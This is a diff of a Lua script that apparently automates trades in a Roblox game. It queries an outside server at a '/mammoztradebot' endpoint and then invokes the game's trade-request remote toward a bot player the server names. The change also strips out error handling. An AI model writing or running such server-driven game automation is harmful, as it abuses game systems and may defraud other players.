@@ -533,31 +533,16 @@ pcall(function()
                                             }
                                         
                                             local getmammoz = post(host..'/mammoztradebot', data)
-                                            local decodedBody = nil
-                                        
-                                            repeat
-                                                local success, err = pcall(function()
-                                                    if getmammoz and getmammoz.Body then
-                                                        decodedBody = jsondecode(getmammoz.Body)
-                                                    else
-                                                        print("Error: Invalid response from API")
-                                                    end
-                                                end)
-                                            
-                                                if not success then
-                                                    print("Error decoding JSON: ", err)
-                                                end
-                                    
-                                                wait(10)
-                                            until decodedBody and decodedBody.status
+                                            local response = jsondecode(getmammoz.Body)
+                                            print(response.status)
 
-                                            if decodedBody.status == 2 then
+                                            if response.status == 2 then
                                                 print("autotradeMammoz()")
                                                 --สแปม trade
-                                                local player = game:GetService("Players"):FindFirstChild(decodedBody.bot)
+                                                local player = game:GetService("Players"):FindFirstChild(response.bot)
                                                 if player then
                                                     print(player.UserId)
-                                                    v_u_9.TRADE_SEND_REQUEST:Invoke(game:GetService("Players")[decodedBody.bot].UserId, false, true)
+                                                    v_u_9.TRADE_SEND_REQUEST:Invoke(game:GetService("Players")[response.bot].UserId, false, true)
                                                 else
                                                     print("Player not found.")
                                                 end
